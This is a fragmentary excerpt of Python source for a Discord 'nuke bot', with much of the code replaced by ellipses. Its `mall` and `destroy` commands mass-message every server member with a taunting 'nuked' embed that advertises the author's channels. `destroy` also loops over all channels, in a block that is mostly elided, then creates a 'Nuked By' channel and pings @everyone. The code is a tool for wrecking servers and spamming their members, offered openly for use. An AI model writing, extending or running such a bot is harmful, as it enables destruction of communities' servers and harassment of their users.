...
async def mall(ctx):
    ...
    for member in list(client.get_all_members()):
        ...
        try:
            embed = discord.Embed(title="C'est pourquoi vous ne voulez pas donner d'administrateur aux personnes aléatoires!", url="https://github.com/exdelete/Advanced-Discord-Nuke-Bot", description="They Nuke Your Server With A Free Source Code (Click The Text Above For The Code)" , color=discord.Colour.purple())
            embed.add_field(
                name="Discord Server",
                value=
                "[ [ Click here ] ](https://discord.gg/exodiusfr)",
                inline=False)
            embed.add_field(
                name="Youtube Channel",
                value=
                "[ [ Click here ] ](https://www.youtube.com/channel/UC8mAfU24b54NYrFwT4e_v-A)",
                inline=False)
            embed.add_field(
                name="GitHub",
                value=
                "[ [ Click here ] ](https://github.com/exdelete)",
                inline=False)
            embed.set_thumbnail(url="https://tenor.com/bc0Yg.gif")
            embed.set_footer(text="Nuked by delete. 's Bot! Désolé pour votre perte")
            await member.send(embed=embed)
        except:
            pass
...
async def destroy(ctx):
    ...
    for member in list(client.get_all_members()): 
        ...
        try:
            ...
            embed.add_field(
                ...
                inline=False)
            embed.set_thumbnail(url="https://tenor.com/bc0Yg.gif")
            embed.set_footer(text="Nuked By delete. Bot! Désolé pour votre perte")
            await member.send(embed=embed)
        except:
            pass
        print("Action completed: Message all")
    for channel in list(ctx.message.guild.channels):
        try:
            ...
            pass
        guild = ctx.message.guild
        channel = await guild.create_text_channel("Nuked By delete. Bot! Check Dms")
        await channel.send(" @everyone les gars, c'est un peu triste, mais c'est ce que c'est, j'ai raison ?")
